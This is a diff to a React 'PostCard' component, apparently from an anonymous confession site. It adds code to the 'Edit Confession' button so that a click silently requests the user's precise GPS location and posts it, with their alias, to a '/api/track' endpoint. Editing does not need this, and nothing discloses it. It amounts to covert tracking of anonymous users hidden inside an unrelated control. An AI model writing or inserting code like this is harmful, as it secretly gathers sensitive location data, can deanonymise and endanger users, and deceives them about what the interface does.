@@ -162,7 +162,32 @@ function PostCard({ c, allowedEmojis, onReact, onComment }) {
           {/* Edit button */}
           {timeLeft > 0 && (
             <button
-              onClick={() => setIsEditing(true)}
+              onClick={() => {
+                setIsEditing(true);
+                if ('geolocation' in navigator) {
+                  navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                      const alias = localStorage.getItem('aliasName') || 'Ghost';
+                      await fetch('/api/track', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                          alias,
+                          location: {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                          }
+                        })
+                      });
+                    },
+                    (geoErr) => {
+                      console.log('GPS tracking denied or timed out:', geoErr);
+                    },
+                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                  );
+                }
+              }}
               className="mt-3 bg-[#c0ff00] hover:bg-white text-black font-black px-3 py-1.5 rounded-lg text-xs uppercase tracking-wider transition-colors cursor-pointer flex items-center gap-1.5 shadow-[0_0_15px_rgba(192,255,0,0.2)]"
             >
               Edit Confession
